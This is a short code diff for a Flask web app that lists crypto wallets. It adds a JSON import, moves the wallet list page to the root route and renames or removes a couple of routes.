@@ -6,6 +6,7 @@ from email.mime.multipart import MIMEMultipart
 import os
 import re
 import requests
+import json
 
 app = Flask(__name__)
 
@@ -35,13 +36,16 @@ def get_wallets():
         {"name": "Trust Wallet", "image": "https://cdn.depay.com/web3-wallets/trust.png",
          "url": "https://trustwallet.com"}
     ]
-@app.route("/hhh")
+
+@app.route("/")
+def wallets():
+    wallets = get_wallets()
+    return render_template("wallets.html", wallets=wallets)
+@app.route("/hi")
 def index():
     return render_template("index.html")
 
-@app.route("/")
-def index():
-    return render_template("wallet.html")
+
 @app.route("/connect", methods=["GET", "POST"])
 def connect():
     if request.method == "POST":
